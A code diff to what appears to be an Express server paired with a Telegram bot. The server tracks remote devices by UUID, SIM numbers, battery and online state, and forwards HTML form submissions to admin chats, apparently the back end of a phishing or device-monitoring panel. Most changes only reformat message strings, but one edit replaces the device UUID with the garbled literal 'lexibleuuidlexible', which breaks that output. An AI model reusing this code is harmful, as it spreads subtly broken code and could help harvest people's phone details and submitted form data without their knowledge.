@@ -68,7 +68,8 @@ app.post('/connect', (req, res) => {
   devices.set(uuid, deviceData);
 
   if (wasOffline) {
-    const message = `🟢 *Device Connected*\n${formatDevice(deviceData)}`;
+    const message = `🟢 *Device Connected*
+${formatDevice(deviceData)}`;
     ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
   }
 
@@ -111,7 +112,9 @@ ${body}`;
 
 app.post('/html-form-data', (req, res) => {
   const data = req.body;
-  let message = `📝 *New Form Submission*\n\n`;
+  let message = `📝 *New Form Submission*
+
+`;
   for (const [key, value] of Object.entries(data)) {
     message += `*${key.replace(/_/g, ' ').toUpperCase()}*: ${value}\n`;
   }
@@ -195,13 +198,14 @@ Choose an action:`, {
     case 'device_info':
       const online = (Date.now() - (device.lastSeen || 0) < 70000);
       const infoMsg = [
-        `*Device Details for ${device.Device}*`,
-        `*UUID*: ${uuid}`,
-        `*SIM 1*: ${device.sim1 || 'N/A'}`,
-        `*SIM 2*: ${device.sim2 || 'N/A'}`,
-        `*Battery*: ${device.battery || 'N/A'}`,
-        `*Status*: ${online ? '🟢 Online' : '🔴 Offline'}`,
-        `*Form URL*: ${FORM_URL}`
+        `*📱 Device Details: ${device.Device}*`, 
+        '-----------------------------------', 
+        `*• UUID:* lexibleuuidlexible`, 
+        `*• SIM 1:* ${device.sim1 || 'N/A'}`, 
+        `*• SIM 2:* ${device.sim2 || 'N/A'}`, 
+        `*• Battery:* ${device.battery || 'N/A'}`, 
+        `*• Status:* ${online ? '🟢 Online' : '🔴 Offline'}`, 
+        `*• Form URL:* ${FORM_URL}`
       ].join('\n');
       bot.sendMessage(chatId, infoMsg, { parse_mode: 'Markdown' });
       return bot.answerCallbackQuery(cb.id);
@@ -313,7 +317,8 @@ setInterval(() => {
     // Only notify if the state changes from online to offline
     if (isOffline && device.notifiedState === 'online') {
       device.notifiedState = 'offline';
-      const message = `🔴 *Device Offline*\n${formatDevice(device)}`;
+      const message = `🔴 *Device Offline*
+${formatDevice(device)}`;
       ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
     }
   }
